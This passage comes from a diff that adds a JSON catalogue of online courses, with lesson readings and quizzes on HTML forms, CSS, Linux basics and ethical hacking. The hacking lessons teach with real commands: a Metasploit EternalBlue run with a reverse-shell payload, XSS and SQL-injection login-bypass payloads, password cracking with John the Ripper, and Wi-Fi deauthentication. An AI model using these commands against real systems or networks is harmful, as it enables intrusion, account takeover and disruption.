type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;</div>",
+        "quiz": [
+          {
+            "q": "Which element is used to create a form?",
+            "opts": [
+              "<input>",
+              "<form>",
+              "<fieldset>"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which input type is used for a submit button?",
+            "opts": [
+              "button",
+              "submit",
+              "action"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "What is the purpose of the <label> tag?",
+            "opts": [
+              "To group form elements",
+              "To make text bold",
+              "To bind text to an input for accessibility"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "title": "6. Introduction to CSS and Selectors",
+        "vid": "yfoY53QXEnI",
+        "reading": "<h3>What is CSS?</h3><p>CSS stands for Cascading Style Sheets. It describes how HTML elements are to be displayed on screen, paper, or in other media. CSS saves a lot of work by controlling the layout of multiple web pages all at once.</p><h3>CSS Syntax</h3><p>A CSS rule consists of a selector and a declaration block:</p><div class='code-block'>h1 {<br>  color: blue;<br>  font-size: 12px;<br>}</div><p>The selector (<code>h1</code>) points to the HTML element you want to style. The declaration block contains one or more declarations separated by semicolons. Each declaration includes a CSS property name and a value, separated by a colon.</p><h3>CSS Selectors</h3><p>CSS selectors are used to \"find\" (or select) the HTML elements you want to style.</p><ul><li><strong>Element Selector:</strong> Selects elements based on the element name. (e.g., <code>p { ... }</code>)</li><li><strong>Class Selector:</strong> Selects elements with a specific class attribute. Starts with a period character. (e.g., <code>.center { ... }</code>)</li><li><strong>ID Selector:</strong> Selects an element with a specific id attribute. Starts with a hash character. (e.g., <code>#header { ... }</code>)</li></ul><div class='note-box'>\ud83d\udca1 Note: An id must be unique within a page, so the id selector is used to select one unique element!</div>",
+        "quiz": [
+          {
+            "q": "What does CSS stand for?",
+            "opts": [
+              "Colorful Style Sheets",
+              "Computer Style Sheets",
+              "Cascading Style Sheets"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "How do you select an element with id 'demo'?",
+            "opts": [
+              "#demo",
+              ".demo",
+              "demo"
+            ],
+            "ans": 0
+          },
+          {
+            "q": "How do you select an element with class 'intro'?",
+            "opts": [
+              "#intro",
+              ".intro",
+              "intro"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "title": "7. CSS Colors, Backgrounds, and Borders",
+        "vid": "1Rs2ND1ryYc",
+        "reading": "<h3>CSS Colors</h3><p>Colors in CSS are specified by valid color names (like <code>red</code>), HEX values (like <code>#ff0000</code>), RGB values (like <code>rgb(255, 0, 0)</code>), or HSL values.</p><div class='code-block'>p {\n  color: tomato;\n}</div><h3>CSS Backgrounds</h3><p>The CSS background properties are used to add background effects for elements.</p><ul><li><code>background-color</code>: Specifies the background color of an element.</li><li><code>background-image</code>: Specifies an image to use as the background.</li><li><code>background-repeat</code>: Specifies if/how a background image will be repeated.</li></ul><div class='code-block'>body {\n  background-color: lightblue;\n}</div><h3>CSS Borders</h3><p>The CSS border properties allow you to specify the style, width, and color of an element's border.</p><div class='note-box'>\ud83d\udca1 Note: The <code>border-style</code> property is required! If this property is not set, no border will be drawn.</div><div class='code-block'>div {\n  border: 2px solid red;\n}</div>",
+        "quiz": [
+          {
+            "q": "Which property changes the text color?",
+            "opts": [
+              "text-color",
+              "color",
+              "font-color"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which property changes the background color?",
+            "opts": [
+              "bg-color",
+              "color-background",
+              "background-color"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "Which border property is absolutely required to show a border?",
+            "opts": [
+              "border-style",
+              "border-width",
+              "border-color"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 7,
+        "title": "8. CSS Box Model",
+        "vid": "rIO53268zaU",
+        "reading": "<h3>The Box Model</h3><p>All HTML elements can be considered as boxes. In CSS, the term \"box model\" is used when talking about design and layout.</p><p>The CSS box model is essentially a box that wraps around every HTML element. It consists of: margins, borders, padding, and the actual content.</p><ul><li><strong>Content:</strong> The content of the box, where text and images appear.</li><li><strong>Padding:</strong> Clears an area around the content. The padding is transparent.</li><li><strong>Border:</strong> A border that goes around the padding and content.</li><li><strong>Margin:</strong> Clears an area outside the border. The margin is transparent.</li></ul><div class='note-box'>\ud83d\udca1 Note: When you set the width and height properties of an element with CSS, you just set the width and height of the <b>content area</b>. To calculate the full size of an element, you must also add padding, borders and margins.</div><h3>Box Sizing</h3><p>The <code>box-sizing</code> property solves the problem of calculating total width. By setting <code>box-sizing: border-box;</code>, padding and border are included in the element's total width and height.</p><div class='code-block'>* {\n  box-sizing: border-box;\n}</div>",
+        "quiz": [
+          {
+            "q": "What is the innermost part of the CSS Box Model?",
+            "opts": [
+              "Padding",
+              "Content",
+              "Margin"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which property creates space inside the border, around the content?",
+            "opts": [
+              "Margin",
+              "Padding",
+              "Border-spacing"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "What does `box-sizing: border-box` do?",
+            "opts": [
+              "Removes all borders",
+              "Makes the element perfectly square",
+              "Includes padding and border in the total width and height"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 8,
+        "title": "9. CSS Text and Font Styling",
+        "vid": "J35jug1uHzE",
+        "reading": "<h3>Text Formatting</h3><p>CSS has many properties to style text, making it readable and visually appealing.</p><ul><li><strong>text-align:</strong> Used to set the horizontal alignment of a text (e.g., <code>center</code>, <code>left</code>, <code>right</code>, <code>justify</code>).</li><li><strong>text-decoration:</strong> Used to set or remove decorations from text. Commonly used to remove underlines from links (<code>text-decoration: none;</code>).</li><li><strong>text-transform:</strong> Used to specify uppercase and lowercase letters in a text (e.g., <code>uppercase</code>, <code>lowercase</code>, <code>capitalize</code>).</li></ul><h3>CSS Fonts</h3><p>The <code>font-family</code> property should hold several font names as a \"fallback\" system. If the browser does not support the first font, it tries the next font.</p><div class='code-block'>p {\n  font-family: \"Times New Roman\", Times, serif;\n  font-size: 16px;\n  font-weight: bold;\n}</div><div class='note-box'>\ud83d\udca1 Note: Font family names with more than one word must be in quotation marks, like \"Times New Roman\".</div>",
+        "quiz": [
+          {
+            "q": "Which property is used to remove the underline from links?",
+            "opts": [
+              "text-style",
+              "text-decoration",
+              "font-decoration"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "How do you make the text bold in CSS?",
+            "opts": [
+              "font-weight: bold;",
+              "font: bold;",
+              "text-weight: bold;"
+            ],
+            "ans": 0
+          },
+          {
+            "q": "Which property aligns text horizontally?",
+            "opts": [
+              "align-text",
+              "text-align",
+              "text-position"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 9,
+        "title": "10. CSS Flexbox Layout",
+        "vid": "K74l26pE4YA",
+        "reading": "<h3>What is Flexbox?</h3><p>The Flexible Box Layout Module, makes it easier to design flexible responsive layout structure without using float or positioning.</p><h3>Flex Container</h3><p>To start using the Flexbox model, you need to first define a flex container. This is done by setting the <code>display</code> property to <code>flex</code>.</p><div class='code-block'>.container {\n  display: flex;\n}</div><h3>Flex Properties</h3><ul><li><strong>flex-direction:</strong> Defines in which direction the container wants to stack the flex items (<code>row</code>, <code>column</code>, <code>row-reverse</code>, <code>column-reverse</code>).</li><li><strong>justify-content:</strong> Used to align the flex items horizontally across the main axis (e.g., <code>center</code>, <code>space-between</code>, <code>space-around</code>).</li><li><strong>align-items:</strong> Used to align the flex items vertically across the cross axis (e.g., <code>center</code>, <code>flex-start</code>, <code>flex-end</code>).</li></ul><div class='note-box'>\ud83d\udca1 Note: Flexbox is primarily a 1-dimensional layout system, meaning it deals with either rows or columns, but not both at the same time.</div>",
+        "quiz": [
+          {
+            "q": "How do you initialize a flexbox container?",
+            "opts": [
+              "display: flexbox;",
+              "display: block flex;",
+              "display: flex;"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "Which property aligns items along the main axis?",
+            "opts": [
+              "align-items",
+              "justify-content",
+              "flex-align"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "What is the default flex-direction?",
+            "opts": [
+              "column",
+              "row",
+              "stack"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 10,
+        "title": "11. CSS Grid Layout",
+        "vid": "jV8B24rSN5o",
+        "reading": "<h3>What is CSS Grid?</h3><p>The CSS Grid Layout Module offers a grid-based layout system, with rows and columns, making it easier to design web pages without having to use floats and positioning.</p><div class='note-box'>\ud83d\udca1 Note: Unlike Flexbox (1-dimensional), CSS Grid is a 2-dimensional layout system, perfect for overall page layouts.</div><h3>Grid Container</h3><p>An element becomes a grid container when its <code>display</code> property is set to <code>grid</code> or <code>inline-grid</code>.</p><div class='code-block'>.grid-container {\n  display: grid;\n  grid-template-columns: auto auto auto;\n  gap: 10px;\n}</div><h3>Grid Properties</h3><ul><li><strong>grid-template-columns:</strong> Defines the number of columns and their widths in the grid layout.</li><li><strong>grid-template-rows:</strong> Defines the height of each row.</li><li><strong>gap:</strong> A shorthand property for row-gap and column-gap, setting the spacing between grid items.</li></ul>",
+        "quiz": [
+          {
+            "q": "CSS Grid is primarily a ___-dimensional layout system.",
+            "opts": [
+              "1",
+              "2",
+              "3"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which property defines the number and width of columns?",
+            "opts": [
+              "grid-columns",
+              "grid-template-columns",
+              "template-cols"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which property sets the space between grid cells?",
+            "opts": [
+              "spacing",
+              "margin",
+              "gap"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 11,
+        "title": "12. Responsive Web Design and Media Queries",
+        "vid": "sQOgbxL9u-4",
+        "reading": "<h3>Responsive Web Design</h3><p>Responsive Web Design is about using HTML and CSS to automatically resize, hide, shrink, or enlarge a website, to make it look good on all devices (desktops, tablets, and phones).</p><h3>The Viewport</h3><p>HTML5 introduced a method to let web designers take control over the viewport (the user's visible area of a web page), through the <code>&lt;meta&gt;</code> tag.</p><div class='code-block'>&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;</div><h3>Media Queries</h3><p>Media queries are a popular technique for delivering a tailored style sheet to different devices. It uses the <code>@media</code> rule to include a block of CSS properties only if a certain condition is true.</p><div class='code-block'>@media screen and (max-width: 600px) {\n  body {\n    background-color: lightblue;\n  }\n}</div><div class='note-box'>\ud83d\udca1 Note: The example above will apply the lightblue background ONLY if the browser window is 600px wide or smaller.</div>",
+        "quiz": [
+          {
+            "q": "What does responsive web design aim to do?",
+            "opts": [
+              "Make websites load faster",
+              "Make websites look good on all devices",
+              "Make websites use less data"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which HTML tag is used to control the viewport?",
+            "opts": [
+              "<viewport>",
+              "<meta>",
+              "<head>"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which CSS rule is used for media queries?",
+            "opts": [
+              "@media",
+              "@query",
+              "@responsive"
+            ],
+            "ans": 0
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "cat": "ETHICAL HACKING",
+    "title": "Ethical Hacking & Penetration Testing",
+    "desc": "Learn Linux command line, Nmap scanning, Metasploit framework, and vulnerability assessment.",
+    "vid": "3Kq1MIfTWCE",
+    "level": "ADVANCED",
+    "bdg": "bdg-o",
+    "lessonsCount": 10,
+    "hrs": "15h",
+    "source": "TCM Security (YouTube)",
+    "rating": "\u2b50 4.9 (2,900 reviews)",
+    "outcomes": [
+      "Master Nmap for network enumeration and port scanning",
+      "Understand Metasploit and vulnerability exploitation",
+      "Document security audit reports ethically"
+    ],
+    "lessons": [
+      {
+        "id": 0,
+        "title": "Introduction to Ethical Hacking",
+        "vid": "fNzpcB7iRxo",
+        "reading": "<h3>What is Ethical Hacking?</h3>\n<p>Ethical hacking involves an authorized attempt to gain unauthorized access to a computer system, application, or data. Carrying out an ethical hack involves duplicating strategies and actions of malicious attackers.</p>\n<div class='note-box'>\ud83d\udca1 Note: Ethical hackers use their skills to improve security by exposing vulnerabilities before malicious hackers can detect and exploit them. Always get explicit permission before testing!</div>\n<h3>Types of Hackers</h3>\n<ul>\n<li><strong>White Hat:</strong> Security professionals who hack for defense.</li>\n<li><strong>Black Hat:</strong> Malicious hackers who exploit systems for personal gain.</li>\n<li><strong>Grey Hat:</strong> Hackers who operate in a gray area, often without permission but without malicious intent.</li>\n</ul>\n<h3>The Penetration Testing Process</h3>\n<p>Professional penetration testing generally follows a structured methodology:</p>\n<ol>\n<li><strong>Reconnaissance (Footprinting):</strong> Gathering information about the target.</li>\n<li><strong>Scanning:</strong> Identifying open ports, services, and network structure.</li>\n<li><strong>Gaining Access:</strong> Exploiting vulnerabilities to enter the system.</li>\n<li><strong>Maintaining Access:</strong> Creating backdoors for future access.</li>\n<li><strong>Covering Tracks:</strong> Erasing logs and evidence of the breach.</li>\n</ol>\n<p>As an ethical hacker, your final step is usually <strong>Reporting</strong> rather than covering tracks.</p>",
+        "quiz": [
+          {
+            "q": "What is the primary difference between a White Hat and a Black Hat hacker?",
+            "opts": [
+              "Their skill level",
+              "Authorization and intent",
+              "The tools they use"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "Linux & Command Line Basics for Hackers",
+        "vid": "v_1zB2WNN14",
+        "reading": "<h3>Why Linux?</h3>\n<p>Most hacking and penetration testing tools are built natively for Linux. Distributions like <strong>Kali Linux</strong> and <strong>Parrot OS</strong> are considered industry standards for ethical hacking.</p>\n<div class='note-box'>\ud83d\udca1 Note: Mastering the Linux Command Line Interface (CLI) is mandatory for any aspiring ethical hacker.</div>\n<h3>Essential Linux Commands</h3>\n<p>Here are some of the most critical commands you'll use on a daily basis:</p>\n<ul>\n<li><code>ls</code> - List directory contents</li>\n<li><code>cd</code> - Change directory</li>\n<li><code>grep</code> - Search text using patterns</li>\n<li><code>cat</code> - Read file contents</li>\n<li><code>chmod</code> - Change file permissions</li>\n</ul>\n<h3>Example: Searching for Sensitive Data</h3>\n<p>You can use the command line to search for specific strings, like 'password', within files:</p>\n<div class='code-block'>grep -r -i \"password\" /var/www/html/</div>\n<p>This command recursively (<code>-r</code>) and case-insensitively (<code>-i</code>) searches for the word \"password\" in the web directory.</p>\n<h3>File Permissions</h3>\n<p>Understanding permissions is crucial for privilege escalation. Linux uses read (r), write (w), and execute (x) permissions for users, groups, and others.</p>\n<div class='code-block'>chmod +x exploit.py</div>\n<p>The command above makes a python script executable.</p>",
+        "quiz": [
+          {
+            "q": "Which command is used to change file permissions in Linux?",
+            "opts": [
+              "chown",
+              "chmod",
+              "chgrp"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "title": "Reconnaissance & Footprinting",
+        "vid": "bK908hEqbGw",
+        "reading": "<h3>What is Reconnaissance?</h3>\n<p>Reconnaissance, or footprinting, is the first phase of ethical hacking. It involves gathering as much information as possible about a target system to find ways to intrude into it.</p>\n<div class='note-box'>\ud83d\udca1 Note: Reconnaissance can be Active (interacting directly with the target) or Passive (gathering info without direct interaction).</div>\n<h3>Passive Reconnaissance</h3>\n<p>Passive recon involves using public resources. Tools and techniques include:</p>\n<ul>\n<li><strong>WHOIS Lookups:</strong> To find domain registration details.</li>\n<li><strong>Google Dorks:</strong> Using advanced search operators to find exposed data.</li>\n<li><strong>OSINT (Open Source Intelligence):</strong> Searching social media, public records, and forums.</li>\n</ul>\n<h3>Example: Google Dorking</h3>\n<p>Google dorks can reveal sensitive files that shouldn't be public:</p>\n<div class='code-block'>site:target.com ext:pdf \"confidential\"</div>\n<p>This searches for PDF files containing the word \"confidential\" on the target's website.</p>\n<h3>Active Reconnaissance</h3>\n<p>Active recon involves probing the target's network directly. This leaves traces and should only be done with permission.</p>\n<ul>\n<li><strong>DNS Enumeration:</strong> Finding subdomains and DNS records (e.g., using <code>nslookup</code> or <code>dig</code>).</li>\n<li><strong>Ping Sweeps:</strong> Checking which IP addresses are active.</li>\n</ul>",
+        "quiz": [
+          {
+            "q": "Which of the following is considered Passive Reconnaissance?",
+            "opts": [
+              "Port scanning the target server",
+              "Querying a public WHOIS database",
+              "Performing a ping sweep"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "title": "Network Scanning with Nmap",
+        "vid": "4GcwzomndI0",
+        "reading": "<h3>Introduction to Nmap</h3>\n<p><strong>Nmap (Network Mapper)</strong> is an open-source tool used for network discovery and security auditing. It is the industry standard for port scanning.</p>\n<div class='note-box'>\ud83d\udca1 Note: Nmap sends specially crafted packets to the target host and analyzes the responses to determine open ports, running services, and operating systems.</div>\n<h3>Basic Nmap Scans</h3>\n<p>To scan a single IP address or hostname:</p>\n<div class='code-block'>nmap 192.168.1.100</div>\n<h3>Advanced Nmap Commands</h3>\n<p>Nmap has powerful flags to customize your scan:</p>\n<ul>\n<li><code>-sV</code> : Probes open ports to determine service and version info.</li>\n<li><code>-O</code> : Enables OS detection.</li>\n<li><code>-p-</code> : Scans all 65535 ports.</li>\n<li><code>-A</code> : Enables OS detection, version detection, script scanning, and traceroute.</li>\n</ul>\n<h3>Example: Comprehensive Scan</h3>\n<p>A typical scan used by penetration testers to gather detailed information:</p>\n<div class='code-block'>nmap -sC -sV -p- 10.10.10.5</div>\n<p>This command uses default Nmap scripts (<code>-sC</code>), probes for versions (<code>-sV</code>), and scans all ports (<code>-p-</code>) on the target IP.</p>",
+        "quiz": [
+          {
+            "q": "Which Nmap flag is used to determine the versions of running services?",
+            "opts": [
+              "-O",
+              "-sV",
+              "-sS"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "title": "Vulnerability Assessment",
+        "vid": "5z1w3uJ11R4",
+        "reading": "<h3>What is Vulnerability Assessment?</h3>\n<p>Vulnerability assessment is the process of identifying, quantifying, and prioritizing vulnerabilities in a system. It answers the question: \"What are our weaknesses?\"</p>\n<div class='note-box'>\ud83d\udca1 Note: While a penetration test involves actively exploiting vulnerabilities, an assessment primarily focuses on identifying them.</div>\n<h3>Common Vulnerability Scanners</h3>\n<p>Automated tools are often used to scan networks for known vulnerabilities:</p>\n<ul>\n<li><strong>Nessus:</strong> One of the most popular commercial vulnerability scanners.</li>\n<li><strong>OpenVAS:</strong> A full-featured open-source vulnerability scanner.</li>\n<li><strong>Nikto:</strong> A command-line web server scanner.</li>\n</ul>\n<h3>Understanding CVSS</h3>\n<p>The <strong>Common Vulnerability Scoring System (CVSS)</strong> provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity (0.0 to 10.0).</p>\n<ul>\n<li><strong>Low:</strong> 0.1 - 3.9</li>\n<li><strong>Medium:</strong> 4.0 - 6.9</li>\n<li><strong>High:</strong> 7.0 - 8.9</li>\n<li><strong>Critical:</strong> 9.0 - 10.0</li>\n</ul>\n<h3>Using SearchSploit</h3>\n<p>If you find a specific service version, you can search for known exploits using the command-line tool <code>searchsploit</code> (an offline copy of Exploit-DB).</p>\n<div class='code-block'>searchsploit Apache 2.4.49</div>",
+        "quiz": [
+          {
+            "q": "What does CVSS stand for in the context of cybersecurity?",
+            "opts": [
+              "Common Vulnerability Scoring System",
+              "Critical Vector Security System",
+              "Computer Virus Surveillance System"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "title": "System Hacking & Metasploit",
+        "vid": "8l1UMBiG6Rg",
+        "reading": "<h3>The Metasploit Framework</h3>\n<p><strong>Metasploit</strong> is an incredibly powerful open-source penetration testing framework used for developing and executing exploit code against a remote target.</p>\n<div class='note-box'>\ud83d\udca1 Note: Metasploit contains a massive database of exploits, payloads, encoders, and auxiliary modules.</div>\n<h3>Metasploit Basics</h3>\n<p>To start Metasploit from the Kali Linux terminal, type <code>msfconsole</code>.</p>\n<p>Key Metasploit concepts:</p>\n<ul>\n<li><strong>Exploit:</strong> The code that takes advantage of a vulnerability.</li>\n<li><strong>Payload:</strong> The code that runs on the target system after a successful exploit (e.g., gaining a reverse shell).</li>\n<li><strong>LHOST / RHOST:</strong> Local Host (your IP) and Remote Host (target IP).</li>\n</ul>\n<h3>Example: Exploiting a Vulnerability</h3>\n<p>Here is a typical workflow in <code>msfconsole</code>:</p>\n<div class='code-block'>use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nexploit</div>\n<h3>Meterpreter Shell</h3>\n<p>If the exploit is successful, you often get a <strong>Meterpreter</strong> session. Meterpreter is an advanced, dynamically extensible payload that provides complex features like keylogging, privilege escalation, and pivoting.</p>",
+        "quiz": [
+          {
+            "q": "In Metasploit, what is the 'Payload'?",
+            "opts": [
+              "The target IP address",
+              "The code that exploits a specific vulnerability",
+              "The code executed on the target after a successful exploit"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "title": "Password Cracking & Privilege Escalation",
+        "vid": "7M1G74x6T7E",
+        "reading": "<h3>Password Cracking Basics</h3>\n<p>Password cracking involves recovering passwords from data that has been stored in or transmitted by a computer system. Attackers typically steal cryptographic hashes and crack them offline.</p>\n<div class='note-box'>\ud83d\udca1 Note: Always use strong, complex passwords and multi-factor authentication (MFA) to mitigate password cracking attacks.</div>\n<h3>Types of Attacks</h3>\n<ul>\n<li><strong>Dictionary Attack:</strong> Trying a predefined list of likely passwords (e.g., the <code>rockyou.txt</code> wordlist).</li>\n<li><strong>Brute Force Attack:</strong> Trying every possible combination of characters.</li>\n<li><strong>Rainbow Tables:</strong> Using precomputed tables for reversing cryptographic hash functions.</li>\n</ul>\n<h3>Popular Tools</h3>\n<p><strong>John the Ripper</strong> and <strong>Hashcat</strong> are the most popular offline password crackers.</p>\n<div class='code-block'>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</div>\n<h3>Privilege Escalation</h3>\n<p>Once an attacker gains initial access (often as a low-privileged user), they will attempt <strong>Privilege Escalation</strong> to gain Administrator or root access.</p>\n<p>Common techniques include:</p>\n<ul>\n<li>Exploiting kernel vulnerabilities.</li>\n<li>Abusing misconfigured file permissions or SUID binaries.</li>\n<li>Finding hardcoded passwords in scripts.</li>\n</ul>",
+        "quiz": [
+          {
+            "q": "Which attack type uses a predefined list of commonly used passwords?",
+            "opts": [
+              "Brute Force Attack",
+              "Rainbow Table Attack",
+              "Dictionary Attack"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 7,
+        "title": "Web Application Hacking",
+        "vid": "2OqisGqPTvk",
+        "reading": "<h3>The OWASP Top 10</h3>\n<p>The <strong>Open Worldwide Application Security Project (OWASP)</strong> Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p>\n<div class='note-box'>\ud83d\udca1 Note: Familiarity with the OWASP Top 10 is mandatory for web penetration testers.</div>\n<h3>Cross-Site Scripting (XSS)</h3>\n<p>XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious scripts in the victim's browser.</p>\n<ul>\n<li><strong>Stored XSS:</strong> The malicious script is permanently stored on the target servers (e.g., in a forum post).</li>\n<li><strong>Reflected XSS:</strong> The malicious script is reflected off a web application onto the victim's browser (often via a crafted URL).</li>\n</ul>\n<h3>Example XSS Payload</h3>\n<p>A basic test payload to see if an input field is vulnerable to XSS:</p>\n<div class='code-block'>&lt;script&gt;alert('XSS Vulnerable!')&lt;/script&gt;</div>\n<h3>Cross-Site Request Forgery (CSRF)</h3>\n<p>CSRF forces an end user to execute unwanted actions on a web application in which they're currently authenticated.</p>",
+        "quiz": [
+          {
+            "q": "Which vulnerability allows an attacker to execute malicious JavaScript in a victim's browser?",
+            "opts": [
+              "SQL Injection",
+              "Cross-Site Scripting (XSS)",
+              "Cross-Site Request Forgery (CSRF)"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 8,
+        "title": "SQL Injection (SQLi)",
+        "vid": "ciNHn38EyRc",
+        "reading": "<h3>What is SQL Injection?</h3>\n<p><strong>SQL Injection (SQLi)</strong> is a code injection technique used to attack data-driven applications. Malicious SQL statements are inserted into entry fields for execution, allowing attackers to view, modify, or delete database data.</p>\n<div class='note-box'>\ud83d\udca1 Note: SQLi is one of the oldest, most prevalent, and most dangerous web application vulnerabilities.</div>\n<h3>How SQLi Works</h3>\n<p>Imagine a login query structured like this:</p>\n<div class='code-block'>SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT';</div>\n<p>If an attacker enters <code>admin' --</code> as the username, the query becomes:</p>\n<div class='code-block'>SELECT * FROM users WHERE username = 'admin' --' AND password = 'PASSWORD_INPUT';</div>\n<p>The <code>--</code> comments out the rest of the query, bypassing the password check completely!</p>\n<h3>Types of SQLi</h3>\n<ul>\n<li><strong>In-Band SQLi (Classic):</strong> Data is extracted using the same channel that is used to inject the SQL code.</li>\n<li><strong>Inferential SQLi (Blind):</strong> No data is actually transferred via the web application. The attacker infers the payload's effect by observing the application's behavior.</li>\n</ul>\n<h3>Mitigation</h3>\n<p>The primary defense against SQLi is the use of <strong>Prepared Statements (Parameterized Queries)</strong>, which separate the query structure from the user input.</p>",
+        "quiz": [
+          {
+            "q": "What is the best way for a developer to prevent SQL Injection vulnerabilities?",
+            "opts": [
+              "Using Prepared Statements (Parameterized Queries)",
+              "Hiding the database IP address",
+              "Encrypting passwords in the database"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 9,
+        "title": "Wireless Network Hacking",
+        "vid": "3Kq1MIfIGCE",
+        "reading": "<h3>Wi-Fi Security Protocols</h3>\n<p>Wireless networks have evolved through several security standards:</p>\n<ul>\n<li><strong>WEP:</strong> Old, completely broken, and can be cracked in minutes. Never use it.</li>\n<li><strong>WPA:</strong> Replaced WEP, but has its own vulnerabilities.</li>\n<li><strong>WPA2:</strong> The modern standard. Highly secure if a strong password is used.</li>\n<li><strong>WPA3:</strong> The latest standard, offering robust protection against dictionary attacks.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: To hack wireless networks, a wireless adapter that supports 'Monitor Mode' and 'Packet Injection' is required.</div>\n<h3>Hacking WPA2</h3>\n<p>The most common method to hack a WPA2 network is capturing the <strong>4-Way Handshake</strong>.</p>\n<ol>\n<li>The attacker puts their wireless card into Monitor Mode using tools like <code>airmon-ng</code>.</li>\n<li>They use <code>airodump-ng</code> to listen for traffic on the target network.</li>\n<li>They forcefully disconnect a connected user using a <em>Deauthentication Attack</em> (with <code>aireplay-ng</code>).</li>\n<li>When the user automatically reconnects, the attacker captures the encrypted WPA2 4-Way Handshake.</li>\n<li>The attacker takes the handshake offline and uses tools like Hashcat or John the Ripper to brute-force the password.</li>\n</ol>\n<h3>Example Commands</h3>\n<div class='code-block'>airmon-ng start wlan0\nairodump-ng wlan0mon\naireplay-ng --deauth 10 -a [Router_MAC] wlan0mon</div>",
+        "quiz": [
+          {
+            "q": "What specific Wi-Fi traffic must an attacker capture to crack a WPA2 password offline?",
+            "opts": [
+              "A DHCP Request",
+              "The 4-Way Handshake",
+              "An ARP broadcast"
+            ],
+            "ans": 1
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "cat": "LINUX",
+    "title": "Linux Command Line Fundamentals",
+    "desc": "Master bash terminal commands, file permissions, processes, ssh, and system administration.",
+    "vid": "ZtqBQ68cfJc",
+    "level": "BEGINNER",
+    "bdg": "bdg-g",
+    "lessonsCount": 13,
+    "hrs": "7h",
+    "source": "freeCodeCamp (YouTube)",
+    "rating": "\u2b50 4.9 (2,100 reviews)",
+    "outcomes": [
+      "Navigate directories using cd, ls, and pwd",
+      "Manage files, read logs, and manipulate text with grep",
+      "Configure file permissions with chmod and chown"
+    ],
+    "lessons": [
+      {
+        "id": 0,
+        "title": "1.1 Introduction to Linux & the Terminal",
+        "vid": "s3G59nC8cXY",
+        "reading": "<h3>Welcome to Linux!</h3><p>Linux is a family of open-source Unix-like operating systems based on the Linux kernel. It is the backbone of the modern internet, powering servers, supercomputers, and smartphones.</p><h3>The Command Line Interface (CLI)</h3><p>While many Linux distributions offer a Graphical User Interface (GUI), the true power of Linux lies in the Command Line Interface (CLI) or <strong>Terminal</strong>.</p><ul><li><strong>Speed:</strong> CLI commands execute tasks faster than clicking through menus.</li><li><strong>Automation:</strong> You can script commands to run automatically.</li><li><strong>Remote Access:</strong> It is much easier and lighter to manage a remote server via SSH using the terminal.</li></ul><div class='note-box'>\ud83d\udca1 Note: When you open a terminal, you are presented with a shell prompt (often ending in a $ or #). This is where you type your commands.</div>",
+        "quiz": [
+          {
+            "q": "What is the main advantage of using the Command Line Interface over a GUI?",
+            "opts": [
+              "It has better graphics and animations",
+              "It provides faster execution and powerful automation capabilities",
+              "It requires a mouse to navigate"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "1.2 Navigating the File System",
+        "vid": "jD6B_44O13U",
+        "reading": "<h3>The Linux Directory Structure</h3><p>Unlike Windows, which uses drive letters like C:, Linux organizes all files in a single unified hierarchy starting from the root directory, denoted by a forward slash (/).</p><h3>Basic Navigation Commands</h3><ul><li><strong>pwd:</strong> Print Working Directory. Shows where you currently are.</li><li><strong>ls:</strong> List directory contents.</li><li><strong>cd:</strong> Change Directory. Move around the file system.</li></ul><div class='code-block'>$ pwd<br>/home/user<br>$ ls<br>Desktop  Documents  Downloads<br>$ cd Documents</div><div class='note-box'>\ud83d\udca1 Note: Use 'cd ..' to move up one directory, and 'cd ~' to return to your home directory.</div>",
+        "quiz": [
+          {
+            "q": "pwd stands for what?",
+            "opts": [
+              "Print Working Directory",
+              "Password Working Data",
+              "Provide Window Directory"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "title": "2.1 Managing Files and Directories",
+        "vid": "v_1Gq_5L5gA",
